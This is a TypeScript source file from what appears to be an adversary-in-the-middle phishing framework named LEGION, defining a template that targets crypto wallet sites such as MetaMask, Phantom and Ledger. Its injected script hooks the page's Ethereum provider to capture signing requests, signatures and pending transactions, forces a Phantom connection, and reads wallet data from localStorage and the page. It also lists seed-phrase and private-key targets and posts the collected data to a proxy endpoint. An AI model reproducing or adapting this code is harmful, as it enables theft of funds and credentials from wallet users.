/**
 * WALLET EXTRACTION TEMPLATE
 *
 * Targets: MetaMask, Phantom, Ledger Live, Trezor, TrustWallet, Coinbase Wallet
 *
 * Extracts:
 * - Wallet addresses (EVM, Solana, TRON, Bitcoin)
 * - Connected chains and networks
 * - Wallet balance across chains
 * - Transaction history
 * - Signature collection (eth_sign, eth_signTypedData)
 * - Private key access (if possible)
 * - Seed phrase confirmation (if interacting with recovery)
 */

import { BaseExtractionTemplate, ExtractionTemplate } from '../extraction-templates.js'

export class WalletTemplate extends BaseExtractionTemplate implements ExtractionTemplate {
  name = 'Wallet Extraction Template'
  category: 'wallet' = 'wallet'
  platforms = ['metamask.io', 'phantom.app', 'ledger.com', 'trezor.io', 'trustwallet.com', 'coinbase.com/wallet']
  supportedChains = ['ethereum', 'polygon', 'arbitrum', 'optimism', 'bsc', 'solana', 'tron', 'ton']
  injectionPoints = ['account', 'dashboard', 'settings', 'security', 'import', 'export', 'recovery']

  extractionTargets = [
    // Primary Wallet Info
    {
      name: 'wallet_address',
      type: 'wallet' as const,
      location: 'window_object' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'hook' as const,
    },
    {
      name: 'wallet_type',
      type: 'credential' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    {
      name: 'public_key',
      type: 'wallet' as const,
      location: 'window_object' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    // Multi-Chain Support
    {
      name: 'evm_address',
      type: 'wallet' as const,
      location: 'window_object' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'hook' as const,
    },
    {
      name: 'solana_address',
      type: 'wallet' as const,
      location: 'window_object' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'hook' as const,
    },
    {
      name: 'bitcoin_address',
      type: 'wallet' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    {
      name: 'tron_address',
      type: 'wallet' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    // Balances
    {
      name: 'native_balance',
      type: 'balance' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'token_balances',
      type: 'balance' as const,
      location: 'api_intercept' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'intercept' as const,
    },
    // Signatures
    {
      name: 'signature_request',
      type: 'signature' as const,
      location: 'memory' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'signature_response',
      type: 'signature' as const,
      location: 'memory' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    {
      name: 'message_signed',
      type: 'signature' as const,
      location: 'memory' as const,
      eventTrigger: 'user_action',
      extractionMethod: 'intercept' as const,
    },
    // Private Key / Security
    {
      name: 'seed_phrase_length',
      type: 'credential' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    {
      name: 'private_key_imported',
      type: 'credential' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    // Account Derivation
    {
      name: 'account_index',
      type: 'credential' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
    {
      name: 'derivation_path',
      type: 'credential' as const,
      location: 'storage' as const,
      eventTrigger: 'page_load',
      extractionMethod: 'direct' as const,
    },
  ]

  walletDetection = {
    detection: {
      metamask: true,
      phantom: true,
      ledger: true,
      trezor: true,
      trustwallet: true,
      coinbase: true,
      walletconnect: true,
    },
    signatureMethod: 'eth_signTypedData_v4' as const,
    permissionRequest: ['eth_accounts', 'eth_signTypedData_v4', 'eth_sendTransaction', 'eth_sign'],
  }

  apiEndpoints = [
    {
      name: 'wallet_connect',
      method: 'POST' as const,
      path: '/api/wallet/connect',
      interceptionType: 'request' as const,
      dataToExtract: ['chainId', 'accounts'],
    },
    {
      name: 'wallet_balance',
      method: 'POST' as const,
      path: '/api/wallet/balance',
      interceptionType: 'response' as const,
      dataToExtract: ['address', 'balance', 'balances'],
    },
    {
      name: 'wallet_transaction',
      method: 'POST' as const,
      path: '/api/wallet/transaction',
      interceptionType: 'request' as const,
      dataToExtract: ['to', 'from', 'value', 'data', 'gas'],
    },
    {
      name: 'eth_sign_message',
      method: 'POST' as const,
      path: '/eth_sign',
      interceptionType: 'both' as const,
      dataToExtract: ['message', 'signature', 'address'],
    },
  ]

  scriptContent = `
(function() {
  const LEGION_WALLET = {
    platform: 'wallet',
    initialized: false,
    walletTypes: [],
    extractedData: {},

    async initialize() {
      console.log('[LEGION] Wallet Template Initialized');

      // Detect all wallet providers
      await this.detectWalletProviders();

      // Hook wallet requests
      this.hookWalletRequests();

      // Monitor signature events
      this.monitorSignatures();

      // Extract existing wallet data
      this.extractWalletData();

      this.initialized = true;
    },

    async detectWalletProviders() {
      // MetaMask
      if (window.ethereum?.isMetaMask) {
        console.log('[LEGION] MetaMask detected');
        this.walletTypes.push('metamask');
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts?.length) {
            this.extractedData.metamask_address = accounts[0];
            this.extractedData.metamask_chain = await window.ethereum.request({ method: 'eth_chainId' });
          }
        } catch (e) {
          console.log('[LEGION] MetaMask access denied');
        }
      }

      // Phantom (Solana)
      if (window.phantom?.solana) {
        console.log('[LEGION] Phantom detected');
        this.walletTypes.push('phantom');
        try {
          const response = await window.phantom.solana.connect();
          this.extractedData.solana_address = response.publicKey.toString();
        } catch (e) {
          console.log('[LEGION] Phantom access denied');
        }
      }

      // Trust Wallet
      if (window.trustwallet) {
        console.log('[LEGION] TrustWallet detected');
        this.walletTypes.push('trustwallet');
      }

      // TronLink
      if (window.tronWeb) {
        console.log('[LEGION] TronLink detected');
        this.walletTypes.push('tronlink');
        try {
          const address = window.tronWeb.defaultAddress.base58;
          this.extractedData.tron_address = address;
        } catch (e) {
          console.log('[LEGION] TronLink access denied');
        }
      }

      // WalletConnect
      if (window.__walletconnect__) {
        console.log('[LEGION] WalletConnect detected');
        this.walletTypes.push('walletconnect');
      }

      console.log('[LEGION] Detected wallets:', this.walletTypes);
    },

    hookWalletRequests() {
      if (!window.ethereum) return;

      const originalRequest = window.ethereum.request.bind(window.ethereum);

      window.ethereum.request = async function(args) {
        const { method, params } = args;

        console.log('[LEGION] Wallet RPC request:', method, params);

        // Monitor signature requests
        if (method === 'eth_signTypedData_v4' || method === 'eth_sign' || method === 'personal_sign') {
          LEGION_WALLET.extractedData.last_signature_method = method;
          LEGION_WALLET.extractedData.last_signature_address = params?.[0];
          LEGION_WALLET.extractedData.last_signature_data = params?.[1];
        }

        // Monitor transaction requests
        if (method === 'eth_sendTransaction') {
          LEGION_WALLET.extractedData.pending_transaction = params?.[0];
        }

        try {
          const result = await originalRequest(args);

          // Capture signature results
          if (method.includes('sign')) {
            LEGION_WALLET.extractedData.last_signature = result;
          }

          return result;
        } catch (e) {
          console.log('[LEGION] Wallet request rejected:', method);
          throw e;
        }
      };
    },

    monitorSignatures() {
      // Monitor provider events
      if (window.ethereum) {
        window.ethereum.on('accountsChanged', (accounts) => {
          console.log('[LEGION] Accounts changed:', accounts);
          this.extractedData.account_changed = accounts[0];
        });

        window.ethereum.on('chainChanged', (chainId) => {
          console.log('[LEGION] Chain changed:', chainId);
          this.extractedData.chain_changed = chainId;
        });

        window.ethereum.on('disconnect', () => {
          console.log('[LEGION] Wallet disconnected');
          this.extractedData.disconnected = true;
        });
      }
    },

    extractWalletData() {
      // Get localStorage wallet data
      const walletKeys = ['wallet_address', 'public_key', 'account_index', 'derivation_path'];
      for (const key of walletKeys) {
        const value = localStorage.getItem(key);
        if (value) {
          this.extractedData[key] = value;
        }
      }

      // Extract from DOM
      const addressElements = document.querySelectorAll('[class*="address"], [id*="address"]');
      addressElements.forEach(el => {
        const text = el.textContent?.trim();
        if (text && (text.startsWith('0x') || text.startsWith('Sol'))) {
          console.log('[LEGION] Found address in DOM:', text.substring(0, 10) + '...');
          this.extractedData.dom_addresses = this.extractedData.dom_addresses || [];
          this.extractedData.dom_addresses.push(text);
        }
      });
    },

    async sendToBackend() {
      try {
        await fetch('/__legion_proxy/api/v1/wallet-extraction', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            platform: 'wallet',
            wallet_types: this.walletTypes,
            timestamp: new Date().toISOString(),
            data: this.extractedData,
          }),
        });
      } catch (e) {
        console.log('[LEGION] Send failed:', e);
      }
    },
  };

  window.__LEGION_EXTRACTION__ = LEGION_WALLET;
})();
  `.trim()
}

/**
 * Wallet template instance
 */
export const walletTemplateInstance = new WalletTemplate()
